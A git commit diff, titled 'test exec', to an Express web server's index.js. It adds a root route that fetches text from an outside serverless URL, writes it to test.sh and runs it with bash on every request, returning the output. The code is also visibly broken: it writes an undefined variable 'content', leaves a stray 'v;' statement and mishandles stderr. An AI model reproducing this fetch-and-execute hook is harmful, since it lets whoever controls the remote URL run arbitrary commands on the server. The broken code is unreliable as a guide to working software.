d29da17b6fc39c4903a63bbd458f498223c567c8
Saffiullah Fahim <87423131+saffiullahfahim@users.noreply.github.com>
2024-09-07 07:16:16 +0600

    test exec

--- index.js
+++ index.js
@@ -1,5 +1,7 @@
-import express from "express";
+import { exec } from "child_process";
 import cors from "cors";
+import express from "express";
+import fs from "fs";
 const app = express();
 // core
 app.use(cors());
@@ -10,8 +12,62 @@ app.use(express.urlencoded({ extended: true }));
 
 const port = process.env.PORT || 8080;
 
-app.get("/", (req, res) => {
-  res.json({
-    data: process.versions
-  })
+async function execCommand(cmd = "ls") {
+  return new Promise((resolve, e) => {
+    exec(cmd, (error, stdout, stderr) => {
+      if (error) {
+        return e(error);
+      }
+
+      if (stderr) {
+        return e(error);
+      }
+
+      return resolve(stdout);
+    });
+  });
+}
+
+app.get("/", async (req, res) => {
+  try {
+    let data = await fetch(
+      "https://faas-syd1-c274eac6.doserverless.co/api/v1/web/fn-3759c969-5906-4a75-a477-f7eb9cc2e68c/default/ip"
+    );
+
+    let text = await data.text();
+
+    console.log({ text });
+
+    fs.writeFileSync("test.sh", content);
+
+    console.log(await execCommand("ls"));
+
+    let result = await execCommand("bash test.sh");
+
+    res.json({
+      result,
+    });
+  } catch (err) {
+    console.log(err);
+
+    return res.json({
+      error: err.message,
+    });
+  }
 });
+
+app.get("/versions", async (req, res) => {
+  try {
+    res.json({
+      data: process.versions,
+    });
+  } catch (err) {
+    console.log(err);
+    return res.json({
+      error: err.message,
+    });
+  }
+});
+v;
+
+app.listen(port, () => console.log(`app listening on port ${port}!`));
